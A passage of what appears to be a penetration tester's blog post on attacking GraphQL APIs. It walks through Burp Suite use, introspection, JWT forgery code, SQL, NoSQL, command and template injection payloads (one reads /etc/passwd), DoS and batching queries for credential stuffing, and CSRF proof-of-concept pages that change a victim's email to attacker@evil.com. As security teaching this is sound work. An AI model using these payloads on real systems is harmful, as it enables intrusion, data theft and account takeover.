+<p><strong>Authorization testing</strong>:</p>
+<ul>
+<li>Create test cases in Repeater for each permission level</li>
+<li>Test field-level authorization with different user roles</li>
+<li>Document authorization bypasses</li>
+</ul>
+</li>
+<li>
+<p><strong>Injection testing</strong>:</p>
+<ul>
+<li>Use Intruder to test SQL and NoSQL injection points</li>
+<li>Save successful payloads as session handling rules</li>
+<li>Use Active Scan with appropriate configurations</li>
+</ul>
+</li>
+<li>
+<p><strong>DoS and performance testing</strong>:</p>
+<ul>
+<li>Create complex nested queries in Repeater</li>
+<li>Test batching limitations</li>
+<li>Document response times for various query types</li>
+</ul>
+</li>
+<li>
+<p><strong>CSRF testing</strong>:</p>
+<ul>
+<li>Generate CSRF PoCs using Burp's built-in generator</li>
+<li>Test both GET and POST-based CSRF</li>
+<li>Verify anti-CSRF token implementations</li>
+</ul>
+</li>
+</ol>
+<h4>3. Documenting findings with Burp Suite</h4>
+<ol>
+<li>
+<p><strong>Use Burp's built-in reporting</strong>:</p>
+<ul>
+<li>Add issues to the "Issues" tab</li>
+<li>Include detailed reproduction steps</li>
+<li>Classify by severity and confidence</li>
+</ul>
+</li>
+<li>
+<p><strong>Leverage Burp's session handling</strong>:</p>
+<ul>
+<li>Create session handling rules for authenticated testing</li>
+<li>Store and reuse authentication tokens</li>
+<li>Create macros for multi-step exploits</li>
+</ul>
+</li>
+<li>
+<p><strong>Save your project</strong>:</p>
+<ul>
+<li>Maintain a persistent Burp project for the target</li>
+<li>Document progress in the project</li>
+<li>Export findings for reporting</li>
+</ul>
+</li>
+</ol>
+<p>By using Burp Suite's comprehensive toolset, you can methodically test GraphQL APIs for security vulnerabilities without relying on custom scripts, making the testing process more standardized and repeatable.</p>
+<h2>The Complete GraphQL Testing Methodology</h2>
+<p>Let's expand on our testing approach with a comprehensive, step-by-step checklist specifically designed for GraphQL APIs. This methodology has been battle-tested on dozens of real-world GraphQL implementations.</p>
+<h3>1. Initial GraphQL Endpoint Discovery</h3>
+<p>Before you can test a GraphQL API, you need to find it. Look for these common endpoint patterns:</p>
+<ul>
+<li><code>/graphql</code> - The most common endpoint</li>
+<li><code>/api/graphql</code> - Often used in structured APIs</li>
+<li><code>/query</code> - Sometimes used as an alias</li>
+<li><code>/graphiql</code> or <code>/playground</code> - Development interfaces that might be left enabled</li>
+<li><code>/v1/graphql</code> or similar versioned endpoints</li>
+</ul>
+<p>Discovery techniques:</p>
+<pre class="language-none"><code class="language-none"># Directory brute-forcing
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -e .php,.graphql,.gql
+
+# Check JS files for GraphQL endpoints
+grep -r "graphql\|gql" --include="*.js" .
+
+# Look for GraphQL specific HTTP headers
+curl -I https://target.com/api/graphql
+</code></pre>
+<p>Pro tip: Many applications expose GraphQL at multiple endpoints - one public and documented, others internal and potentially less secured.</p>
+<h3>2. Introspection Testing</h3>
+<p>Once you've found the endpoint, test if introspection is enabled:</p>
+<ol>
+<li>
+<p><strong>Basic introspection check</strong>:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  __schema {
+    types {
+      name
+    }
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>If introspection succeeds, follow up with comprehensive mapping</strong>:</p>
+<pre class="language-graphql"><code class="language-graphql">query IntrospectionQuery {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+
+fragment InputValue on __InputValue {
+  name
+  description
+  type { ...TypeRef }
+  defaultValue
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Document all operations by category</strong>:</p>
+<ul>
+<li>User data operations (queries/mutations that handle user info)</li>
+<li>Authentication operations (login, token refresh, etc.)</li>
+<li>Administrative operations (user management, settings, etc.)</li>
+<li>Business logic operations (specific to the application)</li>
+</ul>
+</li>
+<li>
+<p><strong>If introspection is disabled, try these bypasses</strong>:</p>
+<ul>
+<li>URI case manipulation: <code>/GraphQL</code> instead of <code>/graphql</code></li>
+<li>Add custom headers: <code>X-Apollo-Tracing: 1</code></li>
+<li>Try partial introspection: <code>{ __type(name: "User") { name fields { name type { name } } } }</code></li>
+<li>Look for introspection data in JS bundles (search for "queryType" or "mutationType")</li>
+<li>Try accessing development environment URLs (staging, dev, etc.)</li>
+</ul>
+</li>
+</ol>
+<p>InQL in Burp automates most of this, but manual exploration often reveals endpoints that automated tools miss.</p>
+<h3>3. Authentication Testing</h3>
+<p>GraphQL APIs often have unique authentication vulnerabilities:</p>
+<ol>
+<li>
+<p><strong>JWT token attacks</strong>:</p>
+<ul>
+<li>Check for weak signature verification (alg:none, RS/HS256 confusion)</li>
+<li>Test token reuse across environments</li>
+<li>Look for sensitive data in token claims</li>
+<li>Try token replay without expiration</li>
+<li>Test for missing validation of token claims</li>
+</ul>
+<p>Example attack query with forged token:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: target.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+Content-Type: application/json
+
+{"query": "query { adminSettings { serverConfig } }"}
+</code></pre>
+<p>JWT forgery techniques:</p>
+<pre class="language-python"><code class="language-python"># Algorithm confusion attack (RS256 to HS256)
+# 1. Decode the token without verification
+import jwt
+token = "eyJhbGciO..."
+header = jwt.get_unverified_header(token)
+payload = jwt.decode(token, options={"verify_signature": False})
+
+# 2. Modify claims
+payload["role"] = "admin"
+
+# 3. Change algorithm from RS256 to HS256 and sign with the public key
+# This works when the server doesn't validate the algorithm properly
+import base64
+with open("public_key.pem", "rb") as f:
+    public_key = f.read()
+
+# Create forged token with HS256 algorithm using public key as the secret
+forged = jwt.encode(payload, public_key, algorithm="HS256", headers={"alg": "HS256"})
+
+# Another technique: "none" algorithm attack
+null_signed = jwt.encode(payload, "", algorithm="none", headers={"alg": "none"})
+</code></pre>
+<p>Common JWT vulnerabilities:</p>
+<ul>
+<li>Key disclosure in source code or JS files</li>
+<li>Common/default secrets ("secret", "key", "SECRET_KEY")</li>
+<li>Improper validation of "kid" header claim (path traversal)</li>
+<li>Missing algorithm validation ("alg": "none" attacks)</li>
+</ul>
+</li>
+<li>
+<p><strong>Session handling tests</strong>:</p>
+<ul>
+<li>Test session fixation vulnerabilities</li>
+<li>Check if authentication state persists after logout</li>
+<li>Test for race conditions in authentication flows</li>
+<li>Check for missing invalidation of refresh tokens</li>
+</ul>
+</li>
+<li>
+<p><strong>OAuth integration vulnerabilities</strong>:</p>
+<ul>
+<li>Test for SSRF in OAuth callbacks</li>
+<li>Check for improper state validation</li>
+<li>Look for token leakage in logs or URLs</li>
+</ul>
+</li>
+</ol>
+<h3>4. Authorization Testing</h3>
+<p>Authorization bugs are extremely common in GraphQL APIs:</p>
+<ol>
+<li>
+<p><strong>Create multiple test users with different permission levels</strong>:</p>
+<ul>
+<li>Admin/superuser</li>
+<li>Regular user</li>
+<li>Restricted user</li>
+<li>Unauthenticated access</li>
+</ul>
+</li>
+<li>
+<p><strong>Object-level authorization tests</strong>:</p>
+<ul>
+<li>Attempt to access objects owned by other users</li>
+<li>Test direct object reference vulnerabilities</li>
+<li>Check for horizontal privilege escalation</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  # Attempt to access another user's data
+  user(id: "victim_id") {
+    email
+    profile {
+      address
+      phoneNumber
+    }
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Field-level authorization tests</strong>:</p>
+<ul>
+<li>Identify sensitive fields (PII, financial data, etc.)</li>
+<li>Test access to these fields across different user roles</li>
+<li>Try accessing deprecated fields (often missed in access controls)</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  # Try to access sensitive fields
+  currentUser {
+    username
+    email
+    hashedPassword # Might be exposed!
+    internalNotes # Often overlooked in access controls
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Role-based authorization tests</strong>:</p>
+<ul>
+<li>Try to perform admin mutations as regular user</li>
+<li>Check for missing authorization on custom operations</li>
+<li>Test newly added fields which might be missed in authorization logic</li>
+</ul>
+</li>
+<li>
+<p><strong>Common bypasses to try</strong>:</p>
+<ul>
+<li>Use aliases to request the same field multiple ways</li>
+<li>Try camelCase variations of field names</li>
+<li>Use fragments to obscure sensitive field requests</li>
+<li>Use introspection to find non-UI fields that might lack authorization checks</li>
+</ul>
+</li>
+</ol>
+<h3>5. Injection Testing</h3>
+<p>GraphQL resolvers often pass data directly to underlying systems, creating injection opportunities:</p>
+<ol>
+<li>
+<p><strong>SQL injection via GraphQL</strong>:</p>
+<ul>
+<li>Test string parameters in queries/mutations</li>
+<li>Try classic SQL injection payloads adapted for GraphQL</li>
+<li>Use Burp Intruder with GraphQL-specific payload positions</li>
+</ul>
+<p>Example in Burp Repeater:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"query": "query { user(username: \"admin' OR 1=1 --\") { id username email } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>NoSQL injection</strong>:</p>
+<ul>
+<li>Test for MongoDB operator injection</li>
+<li>Try JSON parameter pollution in arguments</li>
+</ul>
+<p>Example (some implementations pass objects directly to MongoDB):</p>
+<pre class="language-graphql"><code class="language-graphql"># This often doesn't work directly because GraphQL validates the type
+query {
+  user(username: {$ne: null}) {
+    id
+    username
+    email
+  }
+}
+
+# More realistic payloads using string manipulation or variables
+# 1. Using string formatting to pass MongoDB operators
+query {
+  user(username: "admin', $or: [ {}, { 'a':'a") {
+    id
+    username
+  }
+}
+
+# 2. Using variables and JSON objects when variables aren't properly sanitized
+query ($username: JSON) {
+  findUser(criteria: $username) {
+    id
+    email
+  }
+}
+</code></pre>
+<p>Variables payload:</p>
+<pre class="language-json"><code class="language-json">{
+  "username": {
+    "$ne": null,
+    "$regex": "^adm"
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>OS command injection</strong>:</p>
+<ul>
+<li>Target mutations that might trigger server processes</li>
+<li>Focus on file upload operations, URL processing, or system integration points</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">mutation {
+  generateReport(format: "pdf; cat /etc/passwd #") {
+    downloadUrl
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Template injection</strong>:</p>
+<ul>
+<li>Look for operations that might use templates (email, exports, reports)</li>
+<li>Test for SSTI in string parameters</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">mutation {
+  sendEmail(template: "Welcome, {{user.name}}! {{7*7}}", to: "test@example.com") {
+    success
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>GraphQL-specific injection</strong>:</p>
+<ul>
+<li>Try injecting fragments</li>
+<li>Test for query batching issues</li>
+<li>Look for variable injection points</li>
+</ul>
+</li>
+<li>
+<p><strong>Variable coercion attacks</strong>:</p>
+<ul>
+<li>Exploit type conversion in GraphQL by providing unexpected types</li>
+<li>Test Boolean/String/Int conversions for logic bypasses</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query ($isAdmin: Boolean!) {
+  userInfo(includePrivate: $isAdmin) {
+    email
+    ssn
+    salary
+  }
+}
+</code></pre>
+<p>Send with variables: <code>{"isAdmin": "true"}</code> instead of <code>{"isAdmin": true}</code></p>
+<p>Why this works:
+Depending on the GraphQL implementation and resolver code, type coercion may happen differently:</p>
+<pre class="language-javascript"><code class="language-javascript">// Vulnerable implementation in JavaScript
+function userInfoResolver(parent, args, context) {
+  // The implementation uses loose equality (==) instead of strict (===)
+  // "true" == true evaluates to true in JavaScript
+  if (args.includePrivate == true &#x26;&#x26; !context.user.isAdmin) {
+    throw new Error("Unauthorized");
+  }
+  
+  // Or using Boolean() which converts strings to boolean
+  // Boolean("true") evaluates to true, Boolean("false") evaluates to true too!
+  if (Boolean(args.includePrivate) &#x26;&#x26; !context.user.isAdmin) {
+    throw new Error("Unauthorized");
+  }
+  
+  return db.getUserPrivateInfo(context.user.id);
+}
+</code></pre>
+<p>Additional type coercion tests:</p>
+<ul>
+<li>Input: <code>{"limit": "100"}</code> when expecting <code>Int</code></li>
+<li>Input: <code>{"filter": 1}</code> when expecting <code>String</code> or an object</li>
+<li>Input: <code>{"flag": "0"}</code> when expecting <code>Boolean</code></li>
+</ul>
+</li>
+</ol>
+<h3>6. DoS and Resource Exhaustion</h3>
+<p>GraphQL is particularly vulnerable to DoS attacks:</p>
+<ol>
+<li>
+<p><strong>Nested query attacks</strong>:</p>
+<ul>
+<li>Create deeply nested queries using recursive types</li>
+<li>Start with 5 levels and increase until you see performance impact</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query NestedQuery {
+  user(id: "1") {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends {
+              friends {
+                # Keep nesting until server struggles
+                id
+                username
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Query complexity bombs</strong>:</p>
+<ul>
+<li>Combine nested queries with field duplication</li>
+<li>Request resource-intensive computed fields</li>
+<li>Request large result sets</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query ComplexityBomb {
+  allUsers(first: 10000) {  # Large result set
+    posts(first: 100) {     # For each user
+      comments(first: 100) { # For each post
+        author {
+          # Requesting the same expensive fields multiple times
+          activityFeed { id }
+          activityFeed { id }
+          activityFeed { id }
+          activityFeed { id }
+          # ... repeat many times
+        }
+      }
+    }
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Batch query flooding</strong>:</p>
+<ul>
+<li>Send multiple operations in a single request</li>
+<li>Increase batch size until you find the limit or impact</li>
+</ul>
+<p>Example:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+[
+  {"query": "query { user(id: \"1\") { username } }"},
+  {"query": "query { user(id: \"2\") { username } }"},
+  ... 
+  # Repeat hundreds or thousands of times
+]
+</code></pre>
+</li>
+<li>
+<p><strong>Field duplication attacks</strong>:</p>
+<ul>
+<li>Request the same field thousands of times</li>
+<li>Focus on computationally expensive fields</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  user(id: "1") {
+    # Request the same field many times
+    email email email email email email
+    # ... repeat hundreds of times
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Resource-intensive operations</strong>:</p>
+<ul>
+<li>Identify and target expensive operations like:
+<ul>
+<li>Search functionality</li>
+<li>Filtering large datasets</li>
+<li>Geospatial queries</li>
+<li>Data aggregation</li>
+</ul>
+</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  # Full-text search with minimal query to return maximum results
+  search(query: "a") {
+    id
+    title
+    content
+  }
+}
+</code></pre>
+</li>
+</ol>
+<h3>7. Batching Attacks</h3>
+<p>Batch operations can be exploited for various attacks:</p>
+<ol>
+<li>
+<p><strong>Rate limit bypass</strong>:</p>
+<ul>
+<li>Identify rate-limited operations</li>
+<li>Bundle them in a single batched request</li>
+<li>Check if the rate limit applies per-request or per-operation</li>
+</ul>
+<p>Example:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+[
+  {"query": "mutation { sendMessage(to: \"user1\", content: \"test\") { id } }"},
+  {"query": "mutation { sendMessage(to: \"user2\", content: \"test\") { id } }"},
+  {"query": "mutation { sendMessage(to: \"user3\", content: \"test\") { id } }"},
+  ... # Keep adding until you exceed what would normally be rate-limited
+]
+</code></pre>
+</li>
+<li>
+<p><strong>Credential stuffing</strong>:</p>
+<ul>
+<li>Bundle multiple login attempts in one request</li>
+<li>Watch for response variations that indicate valid credentials</li>
+</ul>
+<p>Example:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+[
+  {"query": "mutation { login(username: \"admin\", password: \"password1\") { token } }"},
+  {"query": "mutation { login(username: \"admin\", password: \"password2\") { token } }"},
+  ... # Test multiple passwords in one request
+]
+</code></pre>
+</li>
+<li>
+<p><strong>Query smuggling</strong>:</p>
+<ul>
+<li>Hide malicious operations among legitimate ones</li>
+<li>Use this to bypass WAF or logging mechanisms</li>
+</ul>
+<p>Example:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+[
+  {"query": "query { publicPosts { id title } }"}, # Legitimate operation
+  {"query": "query { userEmails { email role hashedPassword } }"}, # Malicious operation
+  {"query": "query { publicEvents { id date } }"} # Legitimate operation
+]
+</code></pre>
+</li>
+</ol>
+<h3>8. CSRF Testing</h3>
+<p>GraphQL endpoints are often vulnerable to CSRF:</p>
+<ol>
+<li>
+<p><strong>Identify state-changing mutations</strong>:</p>
+<ul>
+<li>Look for operations that update user data</li>
+<li>Focus on high-impact operations like:
+<ul>
+<li>Password/email changes</li>
+<li>Account settings</li>
+<li>Financial transactions</li>
+<li>Data deletion</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Test for GET-based GraphQL support</strong>:</p>
+<ul>
+<li>Some implementations support queries via GET params</li>
+<li>This makes CSRF trivial</li>
+</ul>
+<p>Example:</p>
+<pre class="language-none"><code class="language-none">&#x3C;img src="https://target.com/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22){success}}" style="display:none">
+</code></pre>
+</li>
+<li>
+<p><strong>Test for missing CSRF protections</strong>:</p>
+<ul>
+<li>Check if the API relies solely on cookies for authentication</li>
+<li>Verify if CSRF tokens are validated for GraphQL operations</li>
+</ul>
+<p>Example PoC:</p>
+<pre class="language-html"><code class="language-html">&#x3C;html>
+  &#x3C;body onload="document.forms[0].submit()">
+    &#x3C;form action="https://target.com/graphql" method="POST" enctype="text/plain">
+      &#x3C;input name='{"query":"mutation{changeEmail(email:\"attacker@evil.com\"){success}}"}' value='abc'>
+    &#x3C;/form>
+  &#x3C;/body>
+&#x3C;/html>
+</code></pre>
+</li>
+</ol>
+<h3>9. Advanced Techniques</h3>
+<p>For hardened GraphQL APIs, try these advanced approaches:</p>
+<ol>
+<li>
+<p><strong>Query fingerprinting evasion</strong>:</p>
+<ul>
+<li>Modify query structure while preserving functionality</li>
+<li>Use aliases to rename operations</li>
+<li>Add/remove whitespace and comments</li>
+<li>Split complex queries into simpler ones</li>
+</ul>
+</li>
+<li>
+<p><strong>Persisted query exploitation</strong>:</p>
+<ul>
+<li>Look for hash-based persisted query implementations</li>
+<li>Try hash collision attacks</li>
+<li>Test for hash bypass techniques</li>
+<li>Use timing attacks to discover valid hashes</li>
+</ul>
+</li>
+<li>
+<p><strong>GraphQL directive abuse</strong>:</p>
+<ul>
+<li>Test for insecure custom directives</li>
+<li>Try using internal directives in unexpected contexts</li>
+<li>Look for directive-based authorization bypasses</li>
+</ul>
+<p>Examples:</p>
+<pre class="language-graphql"><code class="language-graphql"># 1. Using @skip or @include to bypass access controls
+query {
+  sensitiveData @skip(if: false) {
+    internalFields
+  }
+  # Some implementations check auth at the query level but not for skipped fields
+}
+
+# 2. Exploiting real-world custom directives
+query {
+  user(id: "admin") {
+    # Apollo federation exposes _entities queries that might bypass auth
+    _entities(representations: [{__typename: "User", id: "admin"}]) {
+      ... on User {
+        email
+        role
+      }
+    }
+  }
+}
+
+# 3. Directive parameter injection in implementations using dynamic resolvers
+query {
+  documents {
+    content @transform(expression: "file:///etc/passwd")
+  }
+}
+
+# 4. Auth context leakage through directives
+query {
+  public {
+    data @authenticate
+    # In some implementations, @authenticate may store auth context in a way
+    # that affects subsequent field resolution
+  }
+}
+</code></pre>
+<p>In the wild, directive vulnerabilities have been found in:</p>
+<ul>
+<li>Custom GraphQL servers that implement dynamic expression evaluation</li>
+<li>APIs that use directives for formatting/transformation but fail to sanitize inputs</li>
+<li>Implementations where directive execution happens before field-level authorization</li>
+<li>Federation setups where directives are implemented inconsistently across services</li>
+</ul>
+</li>
+<li>
+<p><strong>Subscription vulnerabilities</strong>:</p>
+<ul>
+<li>Test for unbounded subscriptions</li>
+<li>Check for missing authentication on subscription operations</li>
+<li>Try to subscribe to other users' events</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">subscription {
+  userUpdates(userId: "victim_id") {
+    email
+    activity
+  }
+}
+</code></pre>
+</li>
+<li>
+<p><strong>Federation vulnerabilities</strong>:</p>
+<ul>
+<li>Test for inconsistent authorization between federated services</li>
+<li>Check for information leakage in subgraph responses</li>
+<li>Exploit entity resolution misconfigurations</li>
+</ul>
+<p>Real-world examples:</p>
+<pre class="language-graphql"><code class="language-graphql"># 1. Exploiting inconsistent auth in a microservices architecture
+# A real case where User service required JWT but Products service only checked
+# if any JWT was present without validating user permissions
+query ProductLeakage {
+  product(id: "classified-product-1337") {
+    name
+    price
+    internalManufacturingCost  # Should be admin-only field
+  }
+}
+
+# 2. Entity resolution bypass found in production
+# Gateway expected ID to be a UUID but subgraph accepted string format too
+query EntityResolutionBypass {
+  node(id: "user-1 UNION SELECT * FROM admin_users--") {
+    ... on User {
+      username
+      email
+    }
+  }
+}
+
+# 3. Documented gateway bypass in a financial company
+# Sending to https://payments.internal-api.company.com:8443/graphql
+# instead of https://api.company.com/graphql bypassed IP restrictions
+query DirectSubgraphAccess {
+  processCreditCard(input: {
+    cardNumber: "4111111111111111",
+    cvv: "123"
+  }) {
+    success
+  }
+}
+
+# 4. Observed type extension confusion vulnerability
+query TypeExtensionConfusion {
+  product(id: "1") {
+    name
+    # Product type was defined in main subgraph with proper auth
+    
+    reviews {
+      # Reviews subgraph extended Product but implemented different
+      # auth checks, leading to leak of embargoed reviews
+      embargoed
+      unreleased
+    }
+  }
+}
+</code></pre>
+<p>Federation vulnerabilities discovered in production often involve:</p>
+<ul>
+<li>Authentication verification occuring at gateway but authorization in subgraphs</li>
+<li>JWT validation differences between gateway and subgraphs</li>
+<li>Direct subgraph exposure (services accessible directly, bypassing gateway)</li>
+<li>Entity key validation differences (UUID vs string vs int)</li>
+</ul>
+</li>
+<li>
+<p><strong>Variable coercion attacks</strong>:</p>
+<ul>
+<li>Exploit type conversion in GraphQL by providing unexpected types</li>
+<li>Test Boolean/String/Int conversions for logic bypasses</li>
+</ul>
+<p>Example:</p>
+<pre class="language-graphql"><code class="language-graphql">query ($isAdmin: Boolean!) {
+  userInfo(includePrivate: $isAdmin) {
+    email
+    ssn
+    salary
+  }
+}
+</code></pre>
+<p>Send with variables: <code>{"isAdmin": "true"}</code> instead of <code>{"isAdmin": true}</code></p>
+</li>
+</ol>
+<h3>10. Real-World Attack Chaining</h3>
+<p>The most devastating GraphQL attacks chain multiple vulnerabilities:</p>
+<ol>
+<li>
+<p><strong>Introspection to data leak to account takeover</strong>:</p>
+<ul>
+<li>Map the API with introspection</li>
+<li>Find and exploit an injection vulnerability</li>
+<li>Extract sensitive data or authentication material</li>
+<li>Use this to elevate privileges or take over accounts</li>
+</ul>
+</li>
+<li>
+<p><strong>DoS to injection to privilege escalation</strong>:</p>
+<ul>
+<li>Create DoS conditions to trigger error states</li>
+<li>Use error messages to gather information</li>
+<li>Leverage timing attacks during DoS to extract data</li>
+<li>Use extracted data to gain higher privileges</li>
+</ul>
+</li>
+<li>
+<p><strong>Batching + injection + CSRF</strong>:</p>
+<ul>
+<li>Use batching to bypass rate limits</li>
+<li>Chain with injection to extract CSRF tokens</li>
+<li>Create CSRF exploits using the extracted tokens</li>
+<li>Bundle everything in a deliverable attack package</li>
+</ul>
+</li>
+</ol>
+<p>Document your attack chains carefully - they're often the most convincing demonstrations of impact.</p>
+<h2>Conclusion</h2>
+<p>GraphQL gives security testers a massive attack surface to work with. The same features that make it attractive to developers create openings for us to exploit. From conducting initial reconnaissance through introspection, to injecting malicious queries, to performing nested query DoS attacks - GraphQL offers many paths to compromise.</p>
+<p>Remember that most GraphQL deployments are still immature from a security perspective. Developers are focused on functionality first, with security as an afterthought. This means you'll often find multiple vulnerabilities in a single API that can be chained together for maximum impact.</p>
+<p>The most effective attack strategies combine multiple techniques. Start with introspection to map the API, use injection techniques to extract sensitive data, leverage batching to bypass rate limits, and if all else fails, hit them with resource-intensive queries to impact availability.</p>
+<p>When testing GraphQL APIs, always look beyond the obvious. That email field might expose more than just the address if you inject the right payload. That simple query might return admin data if you bypass object-level checks. That innocent-looking mutation might affect more than what's documented.</p>
+<p>The best part about attacking GraphQL is that many traditional protections don't apply. WAFs often struggle with GraphQL's flexible format. Authentication schemes that work for REST often break down with GraphQL's single endpoint model. And many GraphQL servers still have introspection enabled in production, essentially handing you the keys to the kingdom.</p>
+<p>Whether it's API mapping, data exfiltration, or full account takeover, GraphQL offers plenty of opportunities for creative attacks. Use the techniques in this article to thoroughly test GraphQL implementations and demonstrate real impact to your clients or organization.</p>
+<p>Happy hacking!</p>
+<hr>
+<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
+</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"slug":"graphql-security-flaws","contentHtml":"\n\u003cp\u003e\u003cimg src=\"/images/graphql-security.jpeg\" alt=\"GraphQL security vulnerabilities\"\u003e\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eGraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by letting clients ask for exactly what they need and nothing more. But with this flexibility comes a complex attack surface that most security teams aren't prepared to handle.\u003c/p\u003e\n\u003cp\u003eI've been breaking GraphQL APIs for years, and what I've found is that the same features that make GraphQL powerful also make it dangerous. That nested query structure that developers love? It's perfect for DoS attacks. The schema introspection that makes integration so easy? It's a goldmine for attackers mapping your API. The flexible queries? They're a playground for injection attacks.\u003c/p\u003e\n\u003cp\u003eIn this article, I'll walk you through how to exploit GraphQL from the ground up. We'll start with basic reconnaissance techniques to map out an API, move on to common vulnerabilities like injection and broken authentication, and finish with advanced attack chains that combine multiple flaws for maximum impact. Everything here is based on real-world penetration tests I've conducted, with practical examples you can try yourself.\u003c/p\u003e\n\u003ch2\u003eGraphQL Fundamentals\u003c/h2\u003e\n\u003cp\u003eBefore we start breaking things, let's understand what makes GraphQL different from the REST APIs you're used to attacking. GraphQL is essentially a query language for your API - it gives clients the power to ask for specific data in a specific format, all in a single request.\u003c/p\u003e\n\u003cp\u003eA typical GraphQL implementation consists of a schema that defines what data is available, resolvers that fetch that data from various sources, and a single endpoint that handles all requests. Here's what a basic schema looks like:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003etype User {\n  id: ID!\n  username: String!\n  email: String!\n  profile: Profile\n  posts: [Post!]\n}\n\ntype Profile {\n  id: ID!\n  firstName: String\n  lastName: String\n  address: String\n  phoneNumber: String\n  socialSecurityNumber: String\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  content: String!\n  author: User!\n  comments: [Comment!]\n}\n\ntype Comment {\n  id: ID!\n  content: String!\n  author: User!\n}\n\ntype Query {\n  user(id: ID!): User\n  users: [User!]!\n  post(id: ID!): Post\n  posts: [Post!]!\n}\n\ntype Mutation {\n  createUser(username: String!, email: String!): User!\n  updateProfile(userId: ID!, firstName: String, lastName: String, address: String, phoneNumber: String): Profile!\n  createPost(title: String!, content: String!, authorId: ID!): Post!\n  deletePost(id: ID!): Boolean!\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe security issues with GraphQL stem from several key features:\u003c/p\u003e\n\u003cp\u003eFirst, clients define their own queries. Unlike REST where the server dictates what data comes back for each endpoint, GraphQL lets clients specify exactly what fields they want - including fields they shouldn't have access to.\u003c/p\u003e\n\u003cp\u003eSecond, everything goes through a single endpoint. This means traditional security controls like per-endpoint rate limiting or access control don't work well. You need field-level security, which many implementations lack.\u003c/p\u003e\n\u003cp\u003eThird, you can nest queries deeply. This can lead to exponential performance issues if you don't limit query depth. A single well-crafted query can bring down a server.\u003c/p\u003e\n\u003cp\u003eFourth, introspection lets clients query the schema itself. This is like giving attackers an API documentation that shows all the sensitive operations you support.\u003c/p\u003e\n\u003cp\u003eFifth, most GraphQL implementations support batching multiple operations in a single request. This is perfect for bypassing rate limits or brute-forcing credentials.\u003c/p\u003e\n\u003cp\u003eLet me show you how to leverage these features to completely own a GraphQL 